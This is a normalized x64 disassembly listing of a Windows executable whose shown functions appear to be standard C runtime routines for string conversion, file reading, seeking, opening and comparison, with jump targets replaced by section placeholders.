je r-xdata
sub_14004fed8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x20 ] r9w
push rbp
push rsi
push rdi
mov rbp rsp
sub rsp 0x60
mov rdi r8
mov rsi rdx
mov rbx rcx
test rdx rdx
jne r-xdata
test rcx rcx
je r-xdata
test r8 r8
je r-xdata
cmp r8 0x7fffffff
jbe r-xdata
or [ rcx ] 0xffffffff
test rcx rcx
je r-xdata
mov rdx [ rbp + 0x40 ]
lea rcx [ rbp - 0x20 ]
call sub_14003b928
mov r11 [ rbp - 0x20 ]
cmp [ r11 + 0x14 ] 0x0
jne r-xdata
call sub_14003f1a4
mov ebx 0x16
mov [ rax ] ebx
call sub_140043760
xor eax eax
jmp r-xdata
and [ rcx ] edx
and [ rbp + 0x28 ] 0x0
mov ecx [ r11 + 0x4 ]
lea rax [ rbp + 0x28 ]
mov [ rsp + 0x38 ] rax
and [ rsp + 0x30 ] 0x0
lea r8 [ rbp + 0x38 ]
mov r9d 0x1
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rsi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
movzx eax [ rbp + 0x38 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov rbx [ rsp + 0x80 ]
add rsp 0x60
pop rdi
pop rsi
pop rbp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ rbp + 0x28 ] 0x0
jne r-xdata
test rsi rsi
je r-xdata
test rsi rsi
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x2a
call sub_14003f1a4
cmp [ rbp - 0x8 ] 0x0
mov eax [ rax ]
je r-xdata
test rsi rsi
je r-xdata
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
test rdi rdi
jne r-xdata
test rdi rdi
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
call sub_14003f1a4
mov ebx 0x22
mov [ rax ] ebx
call sub_140043760
cmp [ rbp - 0x8 ] 0x0
je r-xdata
test rdi rdi
je r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov [ rbx ] eax
jmp r-xdata
mov [ rbx ] 0x1
mov [ rsi ] al
call sub_14003f1a4
lea ebx [ rdi + 0x22 ]
mov [ rax ] ebx
call sub_140043760
cmp [ rbp - 0x8 ] dil
je r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_14003d760
mov eax ebx
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov r8 rdi
xor edx edx
mov rcx rsi
call sub_14003d760
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_1400500b0
push rbx
sub rsp 0x20
inc [ rw-data ]
mov rbx rcx
mov ecx 0x1000
call sub_140041684
mov [ rbx + 0x10 ] rax
test rax rax
je r-xdata
or [ rbx + 0x18 ] 0x4
lea rax [ rbx + 0x20 ]
mov [ rbx + 0x24 ] 0x2
mov [ rbx + 0x10 ] rax
or [ rbx + 0x18 ] 0x8
mov [ rbx + 0x24 ] 0x1000
jmp r-xdata
mov rax [ rbx + 0x10 ]
and [ rbx + 0x8 ] 0x0
mov [ rbx ] rax
add rsp 0x20
pop rbx
retn
sub_140050104
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
mov eax 0x1050
call sub_14003d700
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1040 ] rax
mov rbp rcx
call sub_14003be60
xor ebx ebx
movsxd r12 eax
cmp [ rbp + 0x8 ] ebx
jge r-xdata
xor edx edx
mov ecx r12d
lea r8d [ rdx + 0x1 ]
call sub_1400504e8
mov rsi rax
test rax rax
jns r-xdata
mov [ rbp + 0x8 ] ebx
mov edx [ rbp + 0x18 ]
mov r13 r12
mov r15 r12
sar r15 0x5
and r13d 0x1f
lea rax [ __dos_header ]
mov rcx [ rax + r15 * 8 + 0x96dc0 ]
imul r13 r13 0x58
mov r14b [ r13 + rcx + 0x38 ]
add r14b r14b
sar r14b 0x1
test edx 0x108
jne r-xdata
or rax 0xffffffffffffffff
jmp r-xdata
mov rdi [ rbp ]
sub rdi [ rbp + 0x10 ]
test dl 0x3
je r-xdata
movsxd rax [ rbp + 0x8 ]
sub rsi rax
mov rcx [ rsp + 0x1040 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x1050 ]
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
test dl dl
js r-xdata
cmp r14b 0x1
jne r-xdata
test rsi rsi
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
jmp r-xdata
test [ r13 + rcx + 0x8 ] 0x80
je r-xdata
cmp [ r13 + rcx + 0x48 ] ebx
je r-xdata
test dl 0x1
je r-xdata
mov rax rdi
jmp r-xdata
mov rax [ rbp + 0x10 ]
jmp r-xdata
shr rdi 0x1
cmp [ rbp + 0x8 ] ebx
je r-xdata
cmp r14b 0x1
jne r-xdata
cmp [ rbp + 0x8 ] ebx
jne r-xdata
cmp rax [ rbp ]
jb r-xdata
mov rax rsi
jmp r-xdata
mov rdx [ r13 + rcx + 0x40 ]
xor r8d r8d
mov ecx r12d
call sub_1400504e8
lea rbp [ __dos_header ]
mov rcx [ rbp + r15 * 8 + 0x96dc0 ]
mov rbx rax
cmp rax [ r13 + rcx + 0x40 ]
jne r-xdata
lea rax [ rdi + rsi ]
shr rdi 0x1
movsxd rbx [ rbp + 0x8 ]
sub rbx [ rbp + 0x10 ]
add rbx [ rbp ]
test [ r13 + rcx + 0x8 ] 0x80
je r-xdata
mov rdi rbx
jmp r-xdata
cmp [ rax ] 0xa
jne r-xdata
mov rcx [ r13 + rcx ]
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x1000
call [ ReadFile@IAT ]
test eax eax
je r-xdata
cmp r14b 0x1
jne r-xdata
xor edx edx
mov ecx r12d
lea r8d [ rdx + 0x2 ]
call sub_1400504e8
cmp rax rsi
jne r-xdata
inc rax
inc rdi
xor r8d r8d
mov rdx rsi
mov ecx r12d
call sub_1400504e8
test rax rax
js r-xdata
sub rsi rbx
shr rbx 0x1
xor r8d r8d
mov rdx rsi
mov ecx r12d
call sub_1400504e8
test rax rax
js r-xdata
mov rax [ rbp + 0x10 ]
lea rcx [ rax + rbx ]
jmp r-xdata
mov eax [ rsp + 0x30 ]
cmp rdi rax
ja r-xdata
mov eax 0x200
cmp rbx rax
ja r-xdata
cmp rax rcx
jb r-xdata
lea rcx [ rsp + 0x40 ]
test rdi rdi
je r-xdata
movsxd rbx [ rbp + 0x24 ]
test [ rbp + 0x18 ] 0x8
je r-xdata
cmp [ rax ] 0xa
jne r-xdata
test [ rbp + 0x18 ] 0x2000
jmp r-xdata
lea rax [ rsp + 0x40 ]
sub rcx rax
lea rax [ rbx + rcx ]
jmp r-xdata
lea rdx [ rsp + rax + 0x40 ]
inc rbx
test [ rbp + 0x18 ] 0x400
mov ebx eax
je r-xdata
inc rax
inc rbx
je r-xdata
cmp [ rcx ] 0xd
jne r-xdata
lea rbp [ __dos_header ]
mov rax [ rbp + r15 * 8 + 0x96dc0 ]
test [ r13 + rax + 0x8 ] 0x4
movzx eax [ rcx ]
movsx rax [ rax + rbp + 0x91b00 ]
add rcx rax
lea rax [ rdx - 0x1 ]
cmp rcx rax
jae r-xdata
dec rdi
cmp rcx rdx
jae r-xdata
inc rcx
test rdi rdi
jne r-xdata
cmp [ rcx + 0x1 ] 0xa
jne r-xdata
inc rcx
jmp r-xdata
sub_1400503f4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x20
mov rbx rcx
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
call sub_14003bd5c
nop
mov rcx rbx
call sub_140050104
mov rdi rax
mov rcx rbx
call sub_14003bdf4
mov rax rdi
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or rax 0xffffffffffffffff
jmp r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_140050450
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
mov edi r8d
mov [ rsp + 0x38 ] rdx
mov ecx ebx
call sub_140046de8
cmp rax 0xffffffffffffffff
jne r-xdata
mov edx [ rsp + 0x38 ]
lea r8 [ rsp + 0x3c ]
mov r9d edi
mov rcx rax
call [ SetFilePointer@IAT ]
mov [ rsp + 0x38 ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
mov rcx rbx
mov rax rbx
lea rdx [ rw-data ]
sar rax 0x5
and ecx 0x1f
mov rax [ rdx + rax * 8 ]
imul rcx rcx 0x58
and [ rax + rcx + 0x8 ] 0xfd
mov rax [ rsp + 0x38 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx eax
call sub_14003f1e4
jmp r-xdata
or rax 0xffffffffffffffff
jmp r-xdata
sub_1400504e8
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov esi r8d
mov r12 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_14003f1c4
and [ rax ] 0x0
call sub_14003f1a4
mov [ rax ] 0x9
jmp r-xdata
call sub_14003f1c4
and [ rax ] 0x0
call sub_14003f1a4
mov [ rax ] 0x9
call sub_140043760
cmp edi [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
mov rbx rdi
mov r13 rdi
sar r13 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r14 + r13 * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_140046e5c
nop
mov rax [ r14 + r13 * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
call sub_14003f1c4
and [ rax ] 0x0
or rbx 0xffffffffffffffff
mov r8d esi
mov rdx r12
mov ecx edi
call sub_140050450
mov rbx rax
jmp r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx edi
call sub_140046f04
mov rax rbx
jmp r-xdata
sub_1400505d0
mov r11 rsp
mov [ r11 + 0x20 ] rbx
push rbp
push rsi
push rdi
sub rsp 0x70
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov [ r11 - 0x50 ] r8
xor ebx ebx
mov rbp rdx
and [ rsp + 0x30 ] ebx
and [ rsp + 0x28 ] ebx
and [ rsp + 0x20 ] ebx
mov r8 rdx
mov rdi rcx
lea rdx [ r11 - 0x40 ]
lea rcx [ r11 - 0x38 ]
xor r9d r9d
call sub_14005415c
mov esi eax
test al 0x4
je r-xdata
lea rdx [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
call sub_1400535c4
test sil 0x2
jne r-xdata
and [ rsp + 0x40 ] 0x0
and [ rsp + 0x44 ] 0x0
mov ebx 0x200
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov ecx [ rsp + 0x48 ]
mov [ rdi ] ebx
mov rax rdi
sub ecx ebp
mov [ rdi + 0x4 ] ecx
mov rcx [ rsp + 0x40 ]
mov [ rdi + 0x10 ] rcx
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xa8 ]
add rsp 0x70
pop rdi
pop rsi
pop rbp
retn
bts ebx 0x8
cmp eax 0x2
jne r-xdata
test sil 0x1
jne r-xdata
sub_14005069c
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x80
xor edi edi
mov r13b 0x80
mov esi r9d
mov rbx rdx
mov [ rbp - 0x18 ] 0x18
lea r12d [ rdi + 0x1 ]
mov [ rbp - 0x28 ] edi
mov [ rbp + 0x58 ] dil
mov [ rbp - 0x10 ] rdi
test r13b r9b
je r-xdata
mov [ rbp - 0x8 ] r12d
mov r15b dil
mov [ rbp - 0x8 ] edi
mov r15b 0x10
jmp r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rdi
call sub_1400436bc
int3
mov eax 0x8000
test eax esi
jne r-xdata
lea rcx [ rbp - 0x28 ]
call sub_14003bf58
test eax eax
jne r-xdata
mov ecx esi
mov r9d 0x3
mov eax 0xc0000000
and ecx r9d
mov r8d 0x80000000
je r-xdata
test esi 0x74000
jne r-xdata
mov r14d r8d
dec ecx
je r-xdata
or r15b r13b
cmp [ rbp - 0x28 ] eax
je r-xdata
mov edx edi
sub ecx 0x10
je r-xdata
test sil 0x8
je r-xdata
dec ecx
je r-xdata
mov r12d r9d
cmp eax r8d
je r-xdata
mov edx r12d
jmp r-xdata
sub ecx 0x10
je r-xdata
mov r14d 0x40000000
jmp r-xdata
test esi 0x70000
jne r-xdata
mov r14d eax
jmp r-xdata
call sub_14003f1c4
mov [ rax ] edi
or [ rbx ] 0xffffffff
call sub_14003f1a4
mov ebx 0x16
mov [ rax ] ebx
call sub_140043760
mov eax ebx
test sil 0x40
je r-xdata
mov al [ rw-data ]
not al
and al [ rbp + 0x68 ]
test al 0x80
lea eax [ rcx - 0x7f ]
cmove ecx eax
mov [ rbp - 0x34 ] ecx
mov r12d 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
mov eax esi
mov ecx 0x700
mov [ rbp - 0x3c ] edx
and eax ecx
mov r8d 0x100
je r-xdata
mov edx r13d
jmp r-xdata
sub ecx 0x10
je r-xdata
mov ecx [ rbp + 0x60 ]
mov [ rbp - 0x40 ] r14d
mov r13d 0x2
sub ecx 0x10
je r-xdata
bt esi 0xc
jae r-xdata
bts ecx 0x1a
bts r14d 0x10
or edx 0x4
mov [ rbp - 0x3c ] edx
mov [ rbp - 0x34 ] ecx
mov [ rbp - 0x40 ] r14d
mov ecx 0x80
mov [ rbp - 0x34 ] ecx
test r8d esi
je r-xdata
mov r12d 0x5
jmp r-xdata
cmp eax 0x300
je r-xdata
mov edx r9d
jmp r-xdata
cmp ecx 0x40
jne r-xdata
test sil 0x20
je r-xdata
or ecx r8d
mov [ rbp - 0x34 ] ecx
mov r12d r13d
jmp r-xdata
cmp eax 0x400
je r-xdata
cmp r14d r8d
mov edx edi
sete dl
jmp r-xdata
test sil 0x10
je r-xdata
bts ecx 0x1b
jmp r-xdata
cmp eax 0x500
je r-xdata
call sub_140046f2c
mov [ rbx ] eax
cmp eax 0xffffffff
jne r-xdata
bts ecx 0x1c
mov [ rbp - 0x34 ] ecx
cmp eax 0x600
je r-xdata
mov rax [ rbp + 0x40 ]
mov r8d [ rbp - 0x3c ]
mov rcx [ rbp + 0x50 ]
mov [ rax ] 0x1
mov eax [ rbp - 0x34 ]
mov [ rsp + 0x30 ] rdi
mov [ rsp + 0x28 ] eax
lea r9 [ rbp - 0x18 ]
mov edx r14d
mov [ rsp + 0x20 ] r12d
call [ CreateFileW@IAT ]
mov [ rbp - 0x20 ] rax
cmp rax 0xffffffffffffffff
jne r-xdata
call sub_14003f1c4
mov [ rax ] edi
or [ rbx ] 0xffffffff
call sub_14003f1a4
mov [ rax ] 0x18
call sub_14003f1a4
mov eax [ rax ]
jmp r-xdata
cmp eax ecx
je r-xdata
mov rcx rax
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx 0xc0000000
mov eax r14d
and eax ecx
cmp eax ecx
jne r-xdata
mov rbx [ rsp + 0xc8 ]
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
cmp eax r13d
jne r-xdata
movsxd rcx [ rbx ]
lea r14 [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r14 + rax * 8 ]
and [ rax + rcx + 0x8 ] 0xfe
call [ GetLastError@IAT ]
mov ecx eax
mov ebx eax
call sub_14003f1e4
mov rcx [ rbp - 0x20 ]
call [ CloseHandle@IAT ]
test ebx ebx
jne r-xdata
movsxd rcx [ rbx ]
lea r14 [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r14 + rax * 8 ]
and [ rax + rcx + 0x8 ] 0xfe
call [ GetLastError@IAT ]
mov ecx eax
call sub_14003f1e4
mov eax 0x1
test al sil
je r-xdata
cmp eax 0x3
jne r-xdata
or r15b 0x40
jmp r-xdata
call sub_14003f1a4
mov edi [ rax ]
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0xd
jmp r-xdata
mov eax edi
jmp r-xdata
mov eax [ rbp - 0x34 ]
mov r8d [ rbp - 0x3c ]
mov rcx [ rbp + 0x50 ]
btr r14d 0x1f
mov [ rsp + 0x30 ] rdi
mov [ rsp + 0x28 ] eax
lea r9 [ rbp - 0x18 ]
mov edx r14d
mov [ rsp + 0x20 ] r12d
mov [ rbp - 0x40 ] r14d
call [ CreateFileW@IAT ]
mov [ rbp - 0x20 ] rax
cmp rax 0xffffffffffffffff
jne r-xdata
mov rdx [ rbp - 0x20 ]
mov ecx [ rbx ]
call sub_140046c8c
movsxd rcx [ rbx ]
lea r14 [ rw-data ]
mov rax rcx
and ecx 0x1f
mov r8d 0x1
sar rax 0x5
or r15b r8b
mov rax [ r14 + rax * 8 ]
imul rcx rcx 0x58
mov [ rax + rcx + 0x8 ] r15b
movsxd rcx [ rbx ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r14 + rax * 8 ]
and [ rax + rcx + 0x38 ] 0x80
mov al r15b
and al 0x48
mov [ rbp - 0x30 ] al
jne r-xdata
or r15b 0x8
test r15b r15b
jns r-xdata
test r15b r15b
jns r-xdata
mov r15d [ rbp - 0x40 ]
mov edx 0x74000
mov ecx 0x4000
test edx esi
jne r-xdata
test r13b sil
je r-xdata
mov ecx 0xc0000000
mov eax r15d
and eax ecx
cmp eax ecx
jne r-xdata
test sil 0x8
je r-xdata
mov eax esi
and eax edx
cmp eax ecx
je r-xdata
mov eax [ rbp - 0x28 ]
and eax edx
jne r-xdata
mov ecx [ rbx ]
mov r8d r13d
or edx 0xffffffff
call sub_140044a78
mov [ rbp - 0x38 ] eax
cmp eax 0xffffffff
jne r-xdata
test r8b sil
je r-xdata
movsxd rcx [ rbx ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r14 + rax * 8 ]
or [ rax + rcx + 0x8 ] 0x20
mov [ rbp + 0x58 ] dil
cmp eax 0x10000
je r-xdata
or esi eax
or esi ecx
jmp r-xdata
mov ecx [ rbx ]
lea rdx [ rbp - 0x2c ]
mov r8d 0x1
mov [ rbp - 0x2c ] di
call sub_140043f64
test eax eax
jne r-xdata
call sub_14003f1c4
cmp [ rax ] 0x83
je r-xdata
mov rcx [ rbp - 0x20 ]
call [ CloseHandle@IAT ]
mov eax [ rbp - 0x34 ]
mov r8d [ rbp - 0x3c ]
mov rcx [ rbp + 0x50 ]
mov [ rsp + 0x30 ] rdi
mov [ rsp + 0x28 ] eax
btr r15d 0x1f
lea r9 [ rbp - 0x18 ]
mov [ rsp + 0x20 ] 0x3
mov edx r15d
call [ CreateFileW@IAT ]
cmp rax 0xffffffffffffffff
jne r-xdata
test r15b 0x40
mov r15d [ rbp - 0x40 ]
mov [ rbp - 0x38 ] edi
jne r-xdata
mov ecx 0x301
mov eax esi
and eax ecx
cmp eax ecx
jne r-xdata
cmp eax 0x14000
je r-xdata
mov ecx [ rbx ]
xor r8d r8d
xor edx edx
call sub_140044a78
cmp eax 0xffffffff
je r-xdata
cmp [ rbp - 0x2c ] 0x1a
jne r-xdata
mov r8d 0x1
mov ecx [ rbx ]
call sub_140044bf0
jmp r-xdata
movsxd rdx [ rbx ]
mov rcx rdx
and edx 0x1f
sar rcx 0x5
imul rdx rdx 0x58
mov rcx [ r14 + rcx * 8 ]
mov [ rdx + rcx ] rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_14003f1e4
movsxd r11 [ rbx ]
mov rax r11
and r11d 0x1f
sar rax 0x5
imul r11 r11 0x58
mov rax [ r14 + rax * 8 ]
and [ rax + r11 + 0x8 ] 0xfe
mov ecx [ rbx ]
call sub_140046d3c
jmp r-xdata
mov r8d 0x1
mov eax r15d
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test esi 0x70000
je r-xdata
mov [ rbp + 0x58 ] r13b
jmp r-xdata
cmp eax 0x20000
je r-xdata
movsxd rdx [ rbp - 0x38 ]
mov ecx [ rbx ]
call sub_1400549c0
cmp eax 0xffffffff
je r-xdata
test r12d r12d
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp r12d r13d
jbe r-xdata
mov ecx [ rbx ]
lea rdx [ rbp - 0x38 ]
mov r8d 0x3
call sub_140043f64
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx ecx [ rbp + 0x58 ]
mov r12d edi
dec ecx
je r-xdata
cmp r12d 0x4
ja r-xdata
cmp eax r13d
je r-xdata
test r12d r12d
je r-xdata
mov [ rbp + 0x58 ] r8b
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ rbp - 0x38 ] 0xbfbbef
mov r13d 0x3
dec ecx
jne r-xdata
cmp r12d 0x5
jne r-xdata
mov ecx [ rbx ]
mov r8d r13d
xor edx edx
call sub_140050450
test rax rax
je r-xdata
movzx eax [ rbp - 0x38 ]
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp r12d r13d
jbe r-xdata
add r12d eax
cmp r13d r12d
jg r-xdata
mov [ rbp - 0x38 ] 0xfeff
jmp r-xdata
mov ecx [ rbx ]
xor r8d r8d
xor edx edx
call sub_140050450
cmp rax 0xffffffffffffffff
cmp eax 0xfeff
jne r-xdata
mov ecx [ rbx ]
call sub_140044bf0
call sub_14003f1a4
mov ebx 0x16
mov [ rax ] ebx
mov edi ebx
jmp r-xdata
mov ecx [ rbx ]
xor r8d r8d
xor edx edx
call sub_140044a78
cmp eax 0xffffffff
jmp r-xdata
cmp [ rbp - 0x38 ] 0xbfbbef
jne r-xdata
cmp r12d 0x4
jbe r-xdata
mov ecx [ rbx ]
movsxd rax r12d
mov r8d r13d
lea rdx [ rbp + rax - 0x38 ]
sub r8d r12d
call sub_14004f254
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ rbx ]
xor r8d r8d
mov edx r13d
call sub_140044a78
cmp eax 0xffffffff
je r-xdata
jne r-xdata
lea r8d [ rax - 0x2 ]
mov [ rbp + 0x58 ] r8b
jmp r-xdata
mov ecx [ rbx ]
mov r8d r13d
xor edx edx
call sub_140050450
test rax rax
je r-xdata
mov [ rbp + 0x58 ] r13b
jmp r-xdata
movsxd rcx [ rbx ]
mov r12b [ rbp + 0x58 ]
mov rax rcx
and ecx 0x1f
and r12b 0x7f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r14 + rax * 8 ]
and [ rax + rcx + 0x38 ] 0x80
or [ rax + rcx + 0x38 ] r12b
movsxd rdx [ rbx ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rcx [ r14 + rax * 8 ]
mov eax esi
and [ rcx + rdx + 0x38 ] 0x7f
shr eax 0x10
shl al 0x7
or [ rcx + rdx + 0x38 ] al
cmp [ rbp - 0x30 ] dil
jne r-xdata
mov ecx [ rbx ]
xor r8d r8d
xor edx edx
call sub_140050450
cmp rax 0xffffffffffffffff
je r-xdata
sub_140050e44
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x40
and [ rsp + 0x30 ] 0x0
xor eax eax
mov rdi [ rsp + 0x70 ]
test rdi rdi
setne al
test eax eax
jne r-xdata
or [ rdi ] 0xffffffff
xor eax eax
test rcx rcx
setne al
test eax eax
je r-xdata
call sub_14003f1a4
mov ebx 0x16
mov [ rax ] ebx
call sub_140043760
cmp [ rsp + 0x78 ] 0x0
je r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
mov [ rsp + 0x28 ] r9d
mov [ rsp + 0x20 ] r8d
mov r9d edx
mov r8 rcx
mov rdx rdi
lea rcx [ rsp + 0x30 ]
call sub_14005069c
mov ebx eax
mov [ rsp + 0x34 ] eax
cmp [ rsp + 0x30 ] 0x0
je r-xdata
test r9d 0xfffffe7f
mov eax 0x0
sete al
test eax eax
je r-xdata
test ebx ebx
je r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
or [ rdi ] 0xffffffff
jmp r-xdata
mov ecx [ rdi ]
call sub_140046f04
movsxd rcx [ rdi ]
mov rax rcx
sar rax 0x5
lea rdx [ rw-data ]
and ecx 0x1f
imul rcx rcx 0x58
mov rax [ rdx + rax * 8 ]
and [ rax + rcx + 0x8 ] 0xfe
sub_140050f18
sub rsp 0x38
mov eax r9d
mov r9d [ rsp + 0x60 ]
mov r10d r8d
mov r11 rdx
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] rcx
mov r8d eax
mov edx r10d
mov rcx r11
call sub_140050e44
add rsp 0x38
retn
sub_140050f4c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
xor r12d r12d
mov rbp r8
mov rdi rdx
mov rsi rcx
mov eax r12d
test r8 r8
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
mov eax 0x7fffffff
jmp r-xdata
lea rcx [ rsp + 0x20 ]
mov rdx r9
call sub_14003b928
mov r11 [ rsp + 0x20 ]
cmp [ r11 + 0x14 ] r12d
jne r-xdata
movzx ecx [ rsi ]
lea rdx [ rsp + 0x20 ]
call sub_1400467ec
movzx ecx [ rdi ]
lea rdx [ rsp + 0x20 ]
movzx ebx ax
call sub_1400467ec
add rsi 0x2
add rdi 0x2
dec rbp
je r-xdata
sub rsi rdi
movzx ecx ax
movzx eax bx
sub eax ecx
cmp [ rsp + 0x38 ] r12b
je r-xdata
test bx bx
je r-xdata
movzx eax [ rdi ]
cmp ax 0x41
jb r-xdata
cmp bx 0x5a
ja r-xdata
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp bx ax
je r-xdata
add rdi 0x2
dec rbp
je r-xdata
cmp ax 0x5a
ja r-xdata
add bx 0x20
test bx bx
je r-xdata
add ax 0x20
cmp bx ax
je r-xdata
movzx ebx [ rsi + rdi ]
cmp bx 0x41
jb r-xdata
jmp r-xdata
sub_140051064
sub rsp 0x28
xor eax eax
mov r10 rdx
mov r11 rcx
cmp [ rw-data ] eax
jne r-xdata
xor r9d r9d
call sub_140050f4c
test r8 r8
je r-xdata
add rsp 0x28
retn
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
mov eax 0x7fffffff
add rsp 0x28
retn
sub r11 rdx
movzx edx [ r10 ]
cmp dx 0x41
jb r-xdata
cmp cx 0x5a
ja r-xdata
add r10 0x2
dec r8
je r-xdata
cmp dx 0x5a
ja r-xdata
add cx 0x20
movzx eax dx
movzx ecx cx
sub ecx eax
mov eax ecx
add rsp 0x28
retn
test cx cx
je r-xdata
add dx 0x20
cmp cx dx
je r-xdata
movzx ecx [ r11 + r10 ]
cmp cx 0x41
jb r-xdata
sub_1400510fc
test r8 r8
jne r-xdata
dec r8
jne r-xdata
xor eax eax
retn
movzx eax [ rcx ]
test ax ax
je r-xdata
movzx eax [ rcx ]
movzx ecx [ rdx ]
sub eax ecx
retn
cmp ax [ rdx ]
jne r-xdata
add rcx 0x2
add rdx 0x2
sub_140051128
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x48 ] rax
mov ebp r8d
mov r14 rdx
mov r13 rcx
call EncodePointer
xor ebx ebx
cmp [ rw-data ] rbx
mov rdi rax
jne r-xdata
mov rax [ rw-data ]
lea rcx [ r--data ]
call [ LoadLibraryW@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
cmp r11 rdi
je r-xdata
xor eax eax
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
mov rcx rax
call [ DecodePointer@IAT ]
mov rcx [ rw-data ]
mov rsi rax
call [ DecodePointer@IAT ]
mov r12 rax
test rsi rsi
je r-xdata
mov rcx rax
